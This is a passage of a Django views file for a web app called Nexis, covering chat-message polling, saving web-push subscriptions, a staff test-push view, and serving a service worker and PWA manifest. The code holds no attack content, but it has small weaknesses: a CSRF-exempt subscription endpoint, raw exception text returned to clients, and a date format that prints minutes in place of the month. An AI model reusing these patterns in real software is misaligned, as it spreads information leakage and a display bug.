        ).order_by('created_at')
        
        # If user is requesting, mark admin messages as read
        if request.user.is_authenticated and not request.user.is_staff:
            messages_list.filter(is_from_admin=True).update(is_read=True)
        # If staff is requesting for a specific profile, mark user messages as read
        elif request.user.is_staff:
            messages_list.filter(is_from_admin=False).update(is_read=True)

        data = []
        for msg in messages_list:
            data.append({
                'id': msg.id,
                'message': msg.message,
                'is_from_admin': msg.is_from_admin,
                'created_at': msg.created_at.strftime('%M %d, %H:%M'),
                'is_read': msg.is_read
            })
        return JsonResponse({'new_messages': data})


import json
from django.views.decorators.csrf import csrf_exempt
from django.http import HttpResponse
from django.conf import settings
from django.contrib.admin.views.decorators import staff_member_required

@csrf_exempt
def save_push_subscription(request):
    """
    Accepts push subscription JSON and saves/updates it in PushSubscription table.
    """
    if request.method != 'POST':
        return JsonResponse({'status': 'error', 'message': 'POST method required.'}, status=405)

    try:
        data = json.loads(request.body.decode('utf-8'))
        endpoint = data.get('endpoint')
        keys = data.get('keys', {})
        p256dh = keys.get('p256dh')
        auth = keys.get('auth')

        if not endpoint or not p256dh or not auth:
            return JsonResponse({'status': 'error', 'message': 'Missing endpoint, p256dh, or auth keys.'}, status=400)

        user = request.user if request.user.is_authenticated else None
        user_agent = request.META.get('HTTP_USER_AGENT', '')[:250]

        sub, created = PushSubscription.objects.update_or_create(
            endpoint=endpoint,
            defaults={
                'user': user,
                'p256dh': p256dh,
                'auth': auth,
                'user_agent': user_agent
            }
        )

        return JsonResponse({
            'status': 'success',
            'created': created,
            'id': sub.id,
            'message': 'Web push subscription registered successfully.'
        })
    except json.JSONDecodeError:
        return JsonResponse({'status': 'error', 'message': 'Invalid JSON body.'}, status=400)
    except Exception as e:
        return JsonResponse({'status': 'error', 'message': str(e)}, status=500)


@staff_member_required
def test_send_push_notification(request):
    """
    Diagnostic view allowing administrators to trigger a test alert to verify
    sound, vibration, and background push notifications.
    """
    from .webpush import send_web_push
    notified = send_web_push(
        title="🔔 Nexis Native Push Test",
        body="High-priority alerts with sound and vibration are fully active on this device!",
        url="/admin/"
    )
    return JsonResponse({
        'status': 'success',
        'subscribers_notified': notified,
        'message': f"Test notification sent to {notified} registered device(s)."
    })


def service_worker_view(request):
    """
    Serves sw.js from the site root scope with Service-Worker-Allowed: / header.
    """
    sw_file = settings.BASE_DIR / 'static' / 'sw.js'
    try:
        with open(sw_file, 'r', encoding='utf-8') as f:
            content = f.read()
    except Exception:
        content = "self.addEventListener('install', e => self.skipWaiting());"
    response = HttpResponse(content, content_type='application/javascript')
    response['Service-Worker-Allowed'] = '/'
    response['Cache-Control'] = 'no-cache, no-store, must-revalidate'
    return response


def manifest_view(request):
    """
    Serves manifest.json from root for PWA standalone support on iOS and Android.
    """
    manifest_file = settings.BASE_DIR / 'static' / 'manifest.json'
    try:
        with open(manifest_file, 'r', encoding='utf-8') as f:
            content = f.read()
    except Exception:
        content = "{}"
    response = HttpResponse(content, content_type='application/manifest+json')
    response['Cache-Control'] = 'public, max-age=86400'
    return response

